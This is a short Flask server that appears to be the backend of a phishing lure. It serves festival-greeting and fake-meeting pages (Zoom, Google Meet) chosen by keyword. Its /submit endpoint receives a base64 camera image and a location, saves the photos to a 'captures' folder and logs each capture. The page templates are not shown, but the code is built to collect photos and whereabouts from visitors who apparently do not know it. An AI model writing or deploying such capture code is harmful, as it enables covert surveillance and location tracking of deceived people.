from flask import Flask, request, render_template, jsonify, send_from_directory
import os
from datetime import datetime
import base64
import geocoder

app = Flask(__name__)

FESTIVALS = ["holi", "diwali", "eid", "christmas", "new year", "ramzaan"]
MEETINGS = ["zoom", "google meet", "class meet"]

@app.route("/")
def home():
    return render_template("home.html")

@app.route("/enter", methods=["POST"])
def enter():
    user_input = request.form.get("name", "").strip().lower()
    if user_input in FESTIVALS:
        return render_template(f"festivals/{user_input.replace(' ', '_')}.html")
    elif user_input in MEETINGS:
        return render_template(f"meetings/{user_input.replace(' ', '_')}.html")
    else:
        return "<h3>Festival or meeting not found. Try again.</h3>", 404

@app.route("/submit", methods=["POST"])
def submit():
    location = request.form.get("location")
    image_data = request.form.get("image", "").split(",")[1]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"captures/{timestamp}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(image_data))
    print(f"[📍] Location: {location}")
    print(f"[📷] Image saved: {filename}")
    return jsonify({"status": "ok", "location": location, "image": filename})

if __name__ == "__main__":
    os.makedirs("captures", exist_ok=True)
    app.run(debug=True)
